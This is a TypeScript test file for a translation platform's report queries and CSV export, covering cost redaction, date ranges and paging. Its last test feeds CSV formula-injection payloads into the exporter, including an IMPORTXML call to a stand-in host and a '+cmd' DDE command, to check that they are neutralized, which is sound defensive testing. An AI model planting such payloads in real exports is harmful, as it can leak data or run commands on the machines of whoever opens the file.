/*
 * Copyright (c) 2026 Hyperlocalise Pty Ltd
 *
 * Use of this software is governed by the Business Source License 1.1
 * included in this application's LICENSE file.
 *
 * Change Date: Four years after publication of the applicable version.
 *
 * On the Change Date, in accordance with the Business Source License, use
 * of this software will be governed by the GNU General Public License
 * Version 2.0 or later.
 */
import "dotenv/config";

import { randomUUID } from "node:crypto";

import { afterEach, beforeAll, describe, expect, it } from "vite-plus/test";

import { createProjectTestFixture } from "@/api/routes/project/project.fixture";
import { db, schema } from "@/lib/database/client";

import { queryReport, REPORT_PAGE_SIZE, reportCsv, type ReportRow } from "./query";

const projectFixture = createProjectTestFixture();

const FROM = "2026-08-01";
const TO = "2026-08-31";
const IN_RANGE = new Date("2026-08-15T12:00:00.000Z");
const OUT_OF_RANGE = new Date("2026-07-01T12:00:00.000Z");

beforeAll(async () => {
  await db.$client.query("select 1");
});

afterEach(async () => {
  await projectFixture.cleanup();
});

async function seedReportFacts() {
  const { organization, project, user } = await projectFixture.createStoredProjectFixture();
  const other = await projectFixture.createStoredProjectFixture();

  await db.insert(schema.reportingCosts).values([
    {
      organizationId: organization.id,
      projectId: project.id,
      operationKey: `human:${randomUUID()}`,
      kind: "human",
      step: "translation",
      targetLocale: "fr-FR",
      amountUsd: "12.50000000",
      basis: "rate",
      createdAt: IN_RANGE,
    },
    {
      organizationId: organization.id,
      projectId: project.id,
      operationKey: `ai:${randomUUID()}`,
      kind: "ai",
      step: "translation",
      targetLocale: "fr-FR",
      amountUsd: "1.25000000",
      basis: "reported",
      inputTokens: 100,
      outputTokens: 40,
      createdAt: IN_RANGE,
    },
    {
      organizationId: organization.id,
      projectId: null,
      operationKey: `org-expense:${randomUUID()}`,
      kind: "expense",
      step: "translation",
      amountUsd: "50.00000000",
      basis: "manual",
      note: "Shared tooling",
      createdAt: IN_RANGE,
    },
    {
      organizationId: organization.id,
      projectId: project.id,
      operationKey: `out-of-range:${randomUUID()}`,
      kind: "human",
      step: "translation",
      amountUsd: "99.00000000",
      basis: "rate",
      createdAt: OUT_OF_RANGE,
    },
    {
      organizationId: other.organization.id,
      projectId: other.project.id,
      operationKey: `other-org:${randomUUID()}`,
      kind: "human",
      step: "translation",
      amountUsd: "7.00000000",
      basis: "rate",
      createdAt: IN_RANGE,
    },
  ]);

  const [analysis] = await db
    .insert(schema.reportingAnalyses)
    .values({
      organizationId: organization.id,
      projectId: project.id,
      step: "translation",
      segmentId: `seg_${randomUUID()}`,
      sourceRevision: `rev_${randomUUID()}`,
      sourceLocale: "en-US",
      targetLocale: "fr-FR",
      words: 25,
      billable: true,
      bucket: "new",
      createdAt: IN_RANGE,
    })
    .returning();

  await db.insert(schema.reportingActivity).values({
    organizationId: organization.id,
    projectId: project.id,
    operationKey: `completion:${randomUUID()}`,
    kind: "completion",
    step: "translation",
    targetLocale: "fr-FR",
    analysisId: analysis.id,
    durationMs: 1500,
    createdAt: IN_RANGE,
  });

  await db.insert(schema.reportingTimeEntries).values({
    organizationId: organization.id,
    projectId: project.id,
    contributorId: user.id,
    step: "translation",
    targetLocale: "fr-FR",
    workDate: IN_RANGE,
    minutes: 45,
    createdAt: IN_RANGE,
  });

  return { organization, project, other };
}

function baseQuery(
  overrides: Partial<{
    from: string;
    to: string;
    projectId: string;
    jobId: string;
    targetLocale: string;
    step: "translation" | "review";
    interval: "day" | "week";
    view: "overview" | "words" | "time" | "costs";
    format: "json" | "csv";
    page: number;
  }> = {},
) {
  return {
    from: FROM,
    to: TO,
    interval: "day" as const,
    view: "overview" as const,
    format: "json" as const,
    page: 1,
    ...overrides,
  };
}

describe("queryReport", () => {
  it("redacts financial amounts for members while still returning AI token usage", async () => {
    const { organization, project } = await seedReportFacts();

    const report = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ view: "costs" }),
    });

    expect(report.financial).toBe(false);
    expect(report.from).toBe(FROM);
    expect(report.to).toBe(TO);

    const kinds = report.rows.map((row) => row.kind).sort();
    expect(kinds).toEqual(["ai"]);
    expect(report.rows.every((row) => row.amountUsd === null)).toBe(true);
    expect(report.rows[0]).toMatchObject({
      kind: "ai",
      inputTokens: 100,
      outputTokens: 40,
      amountUsd: null,
    });
  });

  it("includes human, AI, and org-level expense amounts when financial access is allowed", async () => {
    const { organization, project } = await seedReportFacts();

    const report = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: true,
      query: baseQuery({ view: "costs" }),
    });

    const byKind = Object.fromEntries(report.rows.map((row) => [row.kind, row]));
    expect(byKind.human).toMatchObject({
      projectId: project.id,
      amountUsd: "12.50000000",
    });
    expect(byKind.ai).toMatchObject({
      amountUsd: "1.25000000",
      inputTokens: 100,
      outputTokens: 40,
    });
    expect(byKind.expense).toMatchObject({
      projectId: null,
      amountUsd: "50.00000000",
    });
    expect(report.rows.some((row) => row.amountUsd === "99.00000000")).toBe(false);
    expect(report.rows.some((row) => row.amountUsd === "7.00000000")).toBe(false);
  });

  it("uses an impossible project scope when projectIds is empty", async () => {
    const { organization, project } = await seedReportFacts();

    const withoutFinancial = await queryReport({
      organizationId: organization.id,
      projectIds: [],
      financial: false,
      query: baseQuery({ view: "costs" }),
    });
    expect(withoutFinancial.rows).toEqual([]);

    const withFinancial = await queryReport({
      organizationId: organization.id,
      projectIds: [],
      financial: true,
      query: baseQuery({ view: "costs" }),
    });
    expect(withFinancial.rows).toHaveLength(1);
    expect(withFinancial.rows[0]).toMatchObject({
      kind: "expense",
      projectId: null,
      amountUsd: "50.00000000",
    });
    expect(withFinancial.rows.some((row) => row.projectId === project.id)).toBe(false);
  });

  it("filters fact kinds by report view", async () => {
    const { organization, project } = await seedReportFacts();

    const words = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ view: "words" }),
    });
    expect(words.rows.map((row) => row.kind)).toEqual(["completion"]);
    expect(words.rows[0]).toMatchObject({ words: 25, durationMs: 1500 });
    expect(words.analysis).toMatchObject({
      sourceWords: 25,
      workloadWords: 25,
      completedWords: 25,
    });

    const time = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ view: "time" }),
    });
    expect(time.rows.map((row) => row.kind).sort()).toEqual(["time"]);
    expect(time.rows[0]).toMatchObject({ minutes: 45 });
    // The completed total comes from the server, so tabs without completion rows still show it.
    expect(time.analysis.completedWords).toBe(25);

    const costs = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: true,
      query: baseQuery({ view: "costs" }),
    });
    expect(costs.rows.map((row) => row.kind).sort()).toEqual(["ai", "expense", "human"]);
  });

  it("includes facts at the first and last instants of the range in UTC and nothing outside", async () => {
    const { organization, project } = await projectFixture.createStoredProjectFixture();
    const at = (iso: string) => ({
      organizationId: organization.id,
      projectId: project.id,
      operationKey: `edge:${randomUUID()}`,
      kind: "ai" as const,
      step: "translation",
      basis: "reported" as const,
      inputTokens: 1,
      outputTokens: 0,
      createdAt: new Date(iso),
    });
    await db
      .insert(schema.reportingCosts)
      .values([
        at("2026-07-31T23:59:59.999Z"),
        at("2026-08-01T00:00:00.000Z"),
        at("2026-08-31T23:59:59.999Z"),
        at("2026-09-01T00:00:00.000Z"),
      ]);

    const report = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ view: "costs" }),
    });
    expect(report.rows.reduce((sum, row) => sum + row.inputTokens, 0)).toBe(2);
  });

  it("does not split the overview by job", async () => {
    const { organization, project } = await projectFixture.createStoredProjectFixture();
    await db.insert(schema.reportingCosts).values(
      ["job_a", "job_b"].map((jobId) => ({
        organizationId: organization.id,
        projectId: project.id,
        jobId: null as string | null,
        operationKey: `ai:${jobId}:${randomUUID()}`,
        kind: "ai" as const,
        step: "translation",
        targetLocale: "fr-FR",
        basis: "reported" as const,
        inputTokens: 10,
        outputTokens: 0,
        createdAt: IN_RANGE,
      })),
    );

    const report = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ view: "overview" }),
    });
    expect(report.rows).toHaveLength(1);
    expect(report.rows[0]).toMatchObject({ jobId: null, inputTokens: 20, count: 2 });
  });

  it("pages the table and says when more rows follow, but exports every row as CSV", async () => {
    const { organization, project } = await projectFixture.createStoredProjectFixture();
    await db.insert(schema.reportingCosts).values(
      Array.from({ length: REPORT_PAGE_SIZE + 5 }, (_, day) => ({
        organizationId: organization.id,
        projectId: project.id,
        operationKey: `ai:${randomUUID()}`,
        kind: "ai" as const,
        step: "translation",
        basis: "reported" as const,
        inputTokens: 1,
        outputTokens: 0,
        createdAt: new Date(Date.UTC(2026, 0, 1) + day * 86_400_000),
      })),
    );
    const range = { from: "2026-01-01", to: "2026-12-31", view: "costs" as const };

    const first = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery(range),
    });
    expect(first.rows).toHaveLength(REPORT_PAGE_SIZE);
    expect(first.hasMore).toBe(true);

    const second = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ ...range, page: 2 }),
    });
    expect(second.rows).toHaveLength(5);
    expect(second.hasMore).toBe(false);

    const csv = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ ...range, format: "csv" }),
    });
    expect(csv.rows).toHaveLength(REPORT_PAGE_SIZE + 5);
  });

  it("totals completed words across every page, for one step at a time", async () => {
    const { organization, project } = await projectFixture.createStoredProjectFixture();
    const analyses = await db
      .insert(schema.reportingAnalyses)
      .values(
        Array.from({ length: REPORT_PAGE_SIZE + 5 }, (_, day) => ({
          organizationId: organization.id,
          projectId: project.id,
          step: day === 0 ? ("review" as const) : ("translation" as const),
          segmentId: `seg_${randomUUID()}`,
          sourceRevision: `rev_${randomUUID()}`,
          sourceLocale: "en-US",
          targetLocale: "fr-FR",
          words: 2,
          billable: true,
          bucket: "new" as const,
          createdAt: new Date(Date.UTC(2026, 0, 1) + day * 86_400_000),
        })),
      )
      .returning();
    await db.insert(schema.reportingActivity).values(
      analyses.map((analysis) => ({
        organizationId: organization.id,
        projectId: project.id,
        operationKey: `completion:${randomUUID()}`,
        kind: "completion" as const,
        step: analysis.step,
        targetLocale: "fr-FR",
        analysisId: analysis.id,
        createdAt: analysis.createdAt,
      })),
    );
    const range = { from: "2026-01-01", to: "2026-12-31", view: "words" as const };

    const second = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ ...range, page: 2 }),
    });
    expect(second.rows.length).toBeLessThan(REPORT_PAGE_SIZE);
    expect(second.analysis.completedWords).toBe((REPORT_PAGE_SIZE + 4) * 2);

    const review = await queryReport({
      organizationId: organization.id,
      projectIds: [project.id],
      financial: false,
      query: baseQuery({ ...range, step: "review" }),
    });
    expect(review.analysis.completedWords).toBe(2);
  });
});

describe("reportCsv", () => {
  const sampleRows: ReportRow[] = [
    {
      period: "2026-08-15",
      projectId: "project_1",
      jobId: null,
      targetLocale: "fr-FR",
      step: "translation",
      bucket: null,
      kind: "human",
      words: 0,
      minutes: 0,
      durationMs: 0,
      amountUsd: "12.50000000",
      inputTokens: 0,
      outputTokens: 0,
      unavailable: 0,
      count: 1,
    },
    {
      period: "2026-08-15",
      projectId: "project_1",
      jobId: null,
      targetLocale: "fr-FR",
      step: "translation",
      bucket: null,
      kind: "ai",
      words: 0,
      minutes: 0,
      durationMs: 0,
      amountUsd: null,
      inputTokens: 100,
      outputTokens: 40,
      unavailable: 0,
      count: 1,
    },
  ];

  it("omits amountUsd unless financial access is enabled", () => {
    const memberCsv = reportCsv(sampleRows, false);
    const adminCsv = reportCsv(sampleRows, true);

    expect(memberCsv.split("\r\n")[0]).not.toContain("amountUsd");
    expect(memberCsv).not.toContain("12.50000000");
    expect(adminCsv.split("\r\n")[0]).toContain("amountUsd");
    expect(adminCsv).toContain("12.50000000");
  });

  it("neutralizes spreadsheet formulas in exported cells", () => {
    const csv = reportCsv(
      [
        {
          ...sampleRows[0],
          step: '=IMPORTXML("https://evil.example")',
          kind: "+cmd|'/C calc'!A0",
        },
      ],
      false,
    );

    expect(csv).toContain('"\'=IMPORTXML(""https://evil.example"")"');
    expect(csv).toContain("\"'+cmd|'/C calc'!A0\"");
  });
});
